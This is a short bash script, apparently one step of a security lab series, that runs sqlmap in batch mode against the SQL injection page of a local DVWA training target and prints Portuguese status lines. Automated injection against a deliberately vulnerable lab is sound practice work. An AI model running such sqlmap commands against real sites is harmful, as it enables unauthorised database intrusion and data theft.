
#!/usr/bin/env bash
set -e
echo "[INFO] Play 03 — SQLMap DVWA"
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" --batch -o || true
echo "[SUCESSO] SQLMap finalizado"
